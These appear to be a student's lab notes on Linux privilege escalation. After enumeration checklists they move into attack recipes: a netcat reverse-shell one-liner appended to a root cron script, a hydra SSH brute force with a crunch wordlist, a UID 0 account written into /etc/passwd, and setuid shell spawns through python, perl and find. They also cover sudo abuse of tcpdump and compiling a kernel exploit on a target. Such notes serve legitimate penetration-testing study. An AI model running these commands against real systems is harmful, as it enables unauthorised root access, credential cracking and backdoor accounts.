# Enumerating Linux

### Manual Enumeration
- id
- /etc/passwd
- hostname
- /etc/issue & ```/etc/*-release```
	- OS version, distrbution codename
- uname -a
	- kernel version, arch, etc...
- list system processes
	- ps aux
- list TCP/IP configurations
	- ifconfig -a 
	- ip -a
		- more copact 
- display networking routing tables
	- route
	- routel
- display active network connections and listening ports
	- netstat -anp
	- ss -anp
		- a = all connections
		- n = avoid hostname resolution
			- may stall the command execution
		- p = proces name
- *iptables*
	- must have root priv
	- iptables-persistent
		- saves firewall rules in **/etc/iptables**
			- used to restore *netfilter* rules at boot time
			- often left open
	- *iptables-save* command
		- [search /etc or grep for iptables commands]
			- cat /etc/iptables/rules.v4
		- dumps firewall config to a file
			- file is used for *iptables-restore*s
- cron
	- /etc/cron.*
	- /etc/crontab
		- often root
	- ```crontab -l``` -> view current users scheduled jobs
	- ```sudo crontab -l``` -> view **root** scheduled jobs
- package managers
	- dpkg -l
		- Debian-based
	- rpm
		- Red Hat-based
- Looking for writable files
	- ```find / -writable -type f 2>/dev/null```
		- -writable = attribute interested in
- Looking at unmounted drives
	- cat /etc/fstab
		- all drives that mount at boot time
	- mount
		- all mounted filesystems
- Looking at available disks
	- lsblk
- Enumerate device drivers and kernel modules
	- ```lsmod```
	- ```/sbin/modinfo specific_module```
	- setuid
		- eUID
	- inherits the owners permission (could be root)
	- ```find / -perm -u=s -type f 2>/dev/null```
	- example:
		- if **/bin/cp** were SUID, could copy and overwrite sensitive files such as **/etc/passwd**
- setgid
- Linux Privesc techniques
	- compendium by g0tmi1k
	- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
	- https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- Read strings in binary files
	- ```strings [file]```

### Automated Enumeration

- *unix-privesc-check*
	- **/usr/bin/unix-privesc-check**
	- example:
		- ./unix-privesc-check standard > output.txt
- *LinEnum*
- *LinPeas*

# Exposed Confidential Information

### Inspecting User Trails
- .bashrc
	- executed on new terminal
- env
- example:
	- found password "lab"
	- ```su - root```
- *crunch*
	- CLI tool to generate wordlist for dictionary attack
	- Example:
		- ```crunch 6 6 -t lab%%% > wordlist```
		- min = 6, max = 6, % = numeric digits
		- (since SSH server on tgt)
		- ```hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V```
		- ssh
		- sudo -l
			- check if running as a priv user
		- sudo -i
			- run as root
### Inspecting Service Footprints
- daemons
	- linux services, spawned at boot, perform operations without user
		- i.e. SSH, web servers, db...
	- ```watch -n 1 "ps -aux | grep pass"```
- tcpdump
	- must be root or special priv
	- example:
		- ```sudo tcpdump -i lo -A | grep "pass"```
			- -A = ascii
			- -i = interface
# Insecure File Permission

### Abusing Cron Jobs
- cron log file
	- ```grep "CRON" /var/log/syslog```
	- inspect contents & perm
		- ```cat /home/joe/.scripts/user_backups.sh
			ls -lah /home/joe/.scripts/user_backups.sh```
	- add reverse shell one-liner to script
		- ```cd .scripts```
		- ```echo >> user_backups.sh
		- ```echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.165 1234 >/tmp/f" >> user_backups.sh```
	- set up listener
		- ```nc -lvnp 1234```
		- ```id```

### Abusing Password Authentification
- **/etc/shadow
	- passwords (not readable by normal users)
- **/etc/passwd**
	- hashes stored (historically) in 2nd column
	- takes precedence over the entry in **/etc/passwd**
- *openssl*
	- generate hash
	- using **passwd** argument
		- if no arg -> uses crypt algorithm (maybe DES on older maybe MD5 on newer)
	- ```openssl passwd w00t```
	- ```echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd```
		- [username:password_hash:UID:GID:Comment,,,:home_dir:login_shell]
	- ```su root2```

# Insecure System Components

### Abusing Setuid Binaries & Capabilities
- Full ROOT shell with SUID hack
	- ```Unrelated, but another useful bit if you get a SetUID binary that just makes you `euid=0`:
	
		`python -c 'import os,pty;os.setuid(0);os.setgid(0);pty.spawn("/bin/bash");'`
		
		to get a full root shell.```

- SUID = eUID = effective user
- UID = UID = real user 
- passwd
	- changes password
- ps u -C passwd
- proc psudo-filesystem
	- allows for interaction with kernel info
	- ```grep Uid **/proc/1932/status**```
	- ```ls -asl /usr/bin/passwd```
- ```chmod u+s [file]```
	- adds SUID flag
- If *find* command has SUID -> can use *-exec* falg
	- ```find /home/joe/Desktop -exec "/usr/bin/bash" -p \;```
	- -p = Set Builtin = prevents reset of effective user
- *Linux capabilites*
		- extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for admin operations
	- *getcap*
		- ```/usr/sbin/getcap -r / 2>/dev/null```
			- cap_setuid = setuid capabilites enabled
			- +ep flag = capabilites are effective and permitted
	-  *GTFOBins*
		- website with UNIX binaries & how to elevate privileges
	- ```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'```
	
- [Note] - capabilites, setuid, and setuid flag --> different places in Linux ELF file format

### Abusing Sudo

- **/etc/sudoer** 
	- custom configs of sudo-related permissions
- sudo -l
	- list allowed commands
- Example:
	- abusing ```/usr/sbin/tcpdump``` command
		- ```COMMAND='id'
			TF=$(mktemp)
			echo "$COMMAND" > $TF
			chmod +x $TF
			sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root```
	- investigate error
		- ```cat /var/log/syslog | grep tcpdum```
	- audit daemon logged privesc and blocked by AppArmor
	- AppArmor
		- kernel module provides MAC (mandatory access control)
	- view AppArmer status as the root
		- ```su - root```
		- ```aa-status```
	- abusing *apt-get* 
		- ```sudo apt-get changelog apt```

### Exploiting Kernel Vulnerabilites
- /etc/issue
- uname -r
- arch
- example:
	- ```searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"```
	- ```cp /usr/share/exploitdb/exploits/linux/local/45010.c .```
	- inspect compilation instructions
		- ```head 45010.c -n 20```
	- match naming
		- ```mv 45010.c cve-2017-16995.c```
	- transfer exploit
		- ```scp cve-2017-16995.c joe@192.168.123.216:```
	- compile exploit on tgt machine
		- ```gcc cve-2017-16995.c -o cve-2017-16995```
	- inspect Linux ELF file arch
		- ```file cve-2017-16995```
	- run exploit